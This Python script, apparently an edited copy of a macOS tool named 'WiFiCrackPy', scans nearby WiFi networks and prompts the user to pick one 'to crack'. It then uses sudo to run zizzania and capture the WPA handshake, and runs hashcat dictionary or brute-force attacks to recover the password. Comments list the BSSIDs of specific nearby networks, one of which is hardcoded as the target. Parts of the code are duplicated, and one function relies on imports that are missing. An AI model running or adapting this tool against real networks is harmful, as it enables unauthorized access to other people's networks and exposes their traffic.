import subprocess, re, argparse, CoreWLAN, CoreLocation
from os.path import expanduser, join
from prettytable import PrettyTable
from pyfiglet import Figlet
from time import sleep

import CoreLocation
from time import sleep

def get_location():
    location_manager = CoreLocation.CLLocationManager.alloc().init()
    location_manager.startUpdatingLocation()

    max_wait = 60
    # Get the current authorization status for Python
    for i in range(1, max_wait):
        authorization_status = location_manager.authorizationStatus()
        if authorization_status == 3 or authorization_status == 4:
            print("Python has been authorized for location services")
            break
        if i == max_wait-1:
            exit("Unable to obtain authorization, exiting")
        sleep(1)

    coord = location_manager.location().coordinate()
    lat, lon = coord.latitude, coord.longitude

    print("Your location is %f, %f" % (lat, lon))
   
get_location()


f = Figlet(font='big')
print('\n' + f.renderText('WiFiCrackPy'))

# Define paths
hashcat_path = join(expanduser('~'), 'hashcat', 'hashcat')
zizzania_path = join(expanduser('~'), 'zizzania', 'src', 'zizzania')

# Parse arguments
parser = argparse.ArgumentParser()
parser.add_argument('-w')
parser.add_argument('-m')
parser.add_argument('-i')
parser.add_argument('-p')
parser.add_argument('-d', action='store_false')
parser.add_argument('-o', action='store_true')
args = parser.parse_args()

# Initialise CoreLocation
location_manager = CoreLocation.CLLocationManager.alloc().init()

# Check if location services are enabled
if not location_manager.locationServicesEnabled():
    exit('Location services are disabled, please enable them and try again...')

# Request authorisation for location services
print('Requesting authorisation for location services (required for WiFi scanning)...')
location_manager.requestWhenInUseAuthorization()

# Wait for location services to be authorised
max_wait = 60
for i in range(max_wait):
    authorization_status = location_manager.authorizationStatus()
    # 0 = not determined, 1 = restricted, 2 = denied, 3 = authorised always, 4 = authorised when in use
    if authorization_status in [3, 4]:
        print('Received authorisation, continuing...')
        break
    if i > max_wait:
        exit('Unable to obtain authorisation, exiting...')
    sleep(1)

# Request authorisation for CoreLocation
CoreLocation.CLLocationManager.new().requestAlwaysAuthorization()

# Get the default WiFi interface
cwlan_client = CoreWLAN.CWWiFiClient.sharedWiFiClient()
cwlan_interface = cwlan_client.interface()

def colourise_rssi(rssi):
    if rssi > -60:
        # Green for strong signal
        return f"\033[92m{rssi}\033[0m"
    elif rssi > -80:
        # Yellow for moderate signal
        return f"\033[93m{rssi}\033[0m"
    else:
        # Red for weak signal
        return f"\033[91m{rssi}\033[0m"



def get_interface_object(interface):
    # First check available WiFi Interfaces. If given
    # inteface is valid and present in list return
    # CoreWLAN interface object else return None.
    interfaces_list = CoreWLAN.CWWiFiClient.interfaceNames()
    if interface in interfaces_list:
        return CoreWLAN.CWWiFiClient.sharedWiFiClient().interfaceWithName_(interface)
    else:
        return None


def scan_ssid(interface, ssid):
    CoreLocation.CLLocationManager.new().requestAlwaysAuthorization()
    cwinterface = get_interface_object(interface)
    if cwinterface is not None:
        scan = cwinterface.scanForNetworksWithName_error_(
            ssid, None)
        for ssids in scan:
            if ssids is not None:
                for ssid in ssids:
                    print(ssid)
        return
    else:
        print("Not able to get interface object.")


def scan_networks():
    print('\nScanning for networks...\n')

    # Scan for networks
    scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(None, None)

    # Parse scan results and display in a table
    table = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
    networks = []

    if scan_results is not None:
        for i, result in enumerate(scan_results):
            print('-----i:', i, 'result:', result)
            print('------bssid:', result.bssid())
            
            # pick bssid by airport command
            # multiple line comment

            # JIA 44:f7:70:42:eb:f3
            # JIA 44:f7:70:42:eb:f4

            # 21320-2.4G 24:e8:e5:e8:d0:0a
            # 21320-楼上 24:e8:e5:43:bc:ca


            B320 = '24:e8:e5:e8:d0:0a'
            

            # sudo airport -s | grep "SSID" | awk '{print $2}'
            
            network_info = {
                'ssid': result.ssid(),
                'bssid': B320,
                'rssi': result.rssiValue(),
                'channel_object': result.wlanChannel(),
                'channel_number': result.channel(),
                'security': re.search(r'security=(.*?)(,|$)', str(result)).group(1)
            }
            networks.append(network_info)

         # Sort networks by RSSI value, descending
        networks_sorted = sorted(networks, key=lambda x: x['rssi'], reverse=True)

        # Add sorted networks to table
        for i, network in enumerate(networks_sorted):
            coloured_rssi = colourise_rssi(network['rssi'])
            table.add_row([i + 1, network['ssid'], network['bssid'], coloured_rssi, network['channel_number'], network['security']])
    else:
        exit('No networks found or an error occurred. Exiting...')

    print(table)

    # Ask user to select a network to crack
    x = int(input('\nSelect a network to crack: ')) - 1
    capture_network(networks_sorted[x]['bssid'], networks_sorted[x]['channel_object'])


def capture_network(bssid, channel):
    # Dissociate from the current network
    cwlan_interface.disassociate()

    # Set the channel
    cwlan_interface.setWLANChannel_error_(channel, None)

    # Determine the network interface
    if args.i is None:
        iface = cwlan_interface.interfaceName()
    else:
        iface = args.i

    print('\nInitiating zizzania to capture handshake...\n')

    # Use zizzania to capture the handshake
    # 
    subprocess.run(['sudo', zizzania_path, '-i', iface, '-b', bssid, '-w', 'capture.pcap', '-q'] + ['-n'] * args.d)

    # Convert the capture to hashcat format
    subprocess.run(['hcxpcapngtool', '-o', 'capture.hc22000', 'capture.pcap'], stdout=subprocess.PIPE)

    print('\nHandshake ready for cracking...\n')

    crack_capture()


def crack_capture():
    # Ask user to select a cracking method from menu
    if args.m is None:
        options = PrettyTable(['Number', 'Mode'])
        for i, mode in enumerate(['Dictionary', 'Brute-force', 'Manual']):
            options.add_row([i + 1, mode])
        print(options)
        method = int(input('\nSelect an attack mode: '))
    else:
        method = int(args.m)

    # Get the wordlist
    if method == 1 and args.w is None:
        wordlist = input('\nInput a wordlist path: ')
    elif method == 1 and args.w is not None:
        wordlist = args.w

    # Run hashcat against the capture
    if method == 1:
        subprocess.run([hashcat_path, '-m', '22000', 'capture.hc22000', wordlist] + ['-O'] * args.o)
    elif method == 2:
        # Get the brute-force pattern
        if args.p is None:
            pattern = input('\nInput a brute-force pattern: ')
        else:
            pattern = args.p
        subprocess.run([hashcat_path, '-m', '22000', '-a', '3', 'capture.hc22000', pattern] + ['-O'] * args.o)
    else:
        print('\nRun hashcat against: capture.hc22000')


def scan_for_ssid(ssid: str, timeout_sec: float = 30.0, invert: bool = False) -> bool:
    """
    Determine if the local host can find a specific SSID by name

    :param ssid: The name of the SSID to scan for
    :param timeout_sec: How long to scan (seconds) before giving up (plus duration of one scan, which can take few sec)
    :param invert: If True, verify that the SSID is _not_ found within the timeout
    :return: True if the SSID was found (unless invert==True); False otherwise
    """

    if timeout_sec is None:
        timeout_sec = 10.0

    path_system_profiler = Path('/usr/sbin/system_profiler')
    current_platform = platform.system()

    if current_platform != 'Darwin':
        raise EnvironmentError(f'Platform not supported (yet): {current_platform}')
    if not path_system_profiler.exists():
        raise EnvironmentError(f'{path_system_profiler} not found. Unable to scan for SSIDs')

    ssids: list[str] = []

    print(f'Scanning for SSID: "{ssid}" (timeout: {timeout_sec:.2f} seconds)')
    start_time = time.time()
    while time.time() - start_time <= timeout_sec:
        output: bytes = subprocess.check_output([str(path_system_profiler), 'SPAirPortDataType'])
        text: str = output.decode()
        regex = re.compile(r'\n\s+([\x20-\x7E]{1,32}):\n\s+PHY Mode:') # 0x20...0x7E --> ASCII for printable characters
        for _ssid in sorted(list(set(regex.findall(text)))):
            if _ssid not in ssids:
                ssids.append(_ssid)
            if not invert and ssid in ssids:
                return True
        #print(f'Scanning... ssids found: {sorted(ssids)}')  # debug

    return invert

scan_networks()